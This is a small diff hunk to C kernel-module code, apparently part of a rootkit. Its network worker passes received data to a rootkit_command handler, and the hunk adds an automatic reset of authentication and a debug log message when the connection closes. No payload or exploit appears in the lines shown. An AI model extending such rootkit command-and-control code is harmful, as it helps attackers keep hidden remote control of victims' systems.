@@ -276,6 +276,10 @@ int network_worker(void *data) {
             rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
     }
 
+	// autodisconnect user when connexion is terminated
+	is_auth = false;
+	DBG_MSG("network_worker: connexion terminated, user disconnected\n");
+
     kfree(recv_buffer);
     recv_buffer = NULL;
 
